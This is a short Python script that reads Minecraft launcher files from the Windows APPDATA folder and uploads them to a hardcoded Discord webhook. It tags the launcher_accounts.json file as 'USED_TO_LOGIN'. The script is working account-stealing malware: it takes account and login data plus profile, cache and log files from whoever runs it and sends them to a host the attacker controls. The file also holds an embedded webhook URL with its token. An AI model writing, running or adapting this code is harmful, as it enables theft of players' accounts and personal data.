import os, json
from discord_webhook import DiscordWebhook

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1460101233330360402/EuysERGj4LKOS50x_KY3Uf1CqA4wiEsqE0mohsNg2FIkpuskFnjZG_jDwYS9gkwHX2mx')

# setup paths
apd = os.getenv('APPDATA')
mc = apd + "\.minecraft\\"

# add webhook files
files = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
for x in files:
    with open(mc + x, "rb") as f:
        if (x == 'launcher_accounts.json'):
            x = f"USED_TO_LOGIN-{x}"
        webhook.add_file(file=f.read(), filename=x)

response = webhook.execute()
